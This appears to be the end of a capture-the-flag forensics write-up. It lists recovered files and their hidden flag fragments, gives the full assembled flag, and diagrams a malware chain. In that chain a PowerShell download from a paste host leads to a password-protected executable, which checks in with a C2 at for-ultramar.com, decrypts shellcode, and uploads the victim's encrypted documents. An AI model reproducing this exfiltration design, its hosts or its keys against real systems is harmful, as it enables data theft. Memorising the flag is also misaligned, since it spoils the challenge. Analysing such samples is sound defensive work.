| `hello_darkness_my_old_friend.txt` | 165 B | ASCII text | ✅ Readable |
| `IDK_why_I_saved_this.xlsx` | 10,045 B | `PK..` (ZIP/OOXML) | ✅ Valid XLSX |
| `sexy_picture.jpg` | 33,504 B | `FFD8FFE0` (JFIF) | ✅ Valid JPEG |

### Flag Fragments

The flag is split across multiple files, hidden visually within the document content:

| File | Content | Flag Fragment |
|------|---------|---------------|
| `hello_darkness_my_old_friend.txt` | Author greeting from Reisen_1943 | *(context clue)* |
| `IDK_why_I_saved_this.xlsx` | Vietnamese poetry (Truyện Kiều) in cell A1-A18, flag in cell A21 | `CMO{Dumb357` |
| `sexy_picture.jpg` | JPEG image with text | `_P3r50n_` |
| `Cool_Story.docx` | More Vietnamese poetry (Truyện Kiều), flag in background/formatting | `1n_7h3_M1lky_W4y_!!!}` |

### Flag

```
CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
```

---

## Malware Chain Summary

```
Attacker types commands via USB keyboard
         │
         ▼
PowerShell downloads base64 zip from https://0x0.st/PbWE.txt
         │
         ▼
unzip -P "1m_g0d_!!" → module.exe
         │
         ▼
module.exe:
  ├── GET http://for-ultramar.com:9999/
  │     → receives SHA-256(ComputerName) hash
  │     → verifies local computer matches (anti-analysis)
  │
  ├── AES-256-CBC decrypt embedded resource
  │     Key = SHA-256(ComputerName) = C2 hash (raw 32 bytes)
  │     IV  = 0f0e0d0c0b0a09080706050403020100
  │     → 36,576-byte shellcode
  │
  └── Execute shellcode in memory
              │
              ▼
        Reflective PE Loader (shellcode)
          ├── Packed PE data at offset 0xc6d (inner stub)
          ├── Config data at offset 0x3760
          │     XOR decrypt → embedded "shellcode" DLL (22,016 bytes)
          └── Load DLL into memory, call entry point
                       │
                       ▼
                 C2 Agent (shellcode_dll.exe)
                   ├── FindFirstFile("*")
                   ├── Filter: .txt .doc .docx .xls .xlsx .png .jpg
                   ├── For each file:
                   │     1. Generate 4 random key bytes
                   │     2. AES key = SHA-256(4 bytes)
                   │     3. PKCS7 pad, AES-256-CBC encrypt
                   │     4. Prepend 4 key bytes to ciphertext
                   │     5. POST /upload to C2
                   └── Sleep(10) between files
```
{% endraw %}
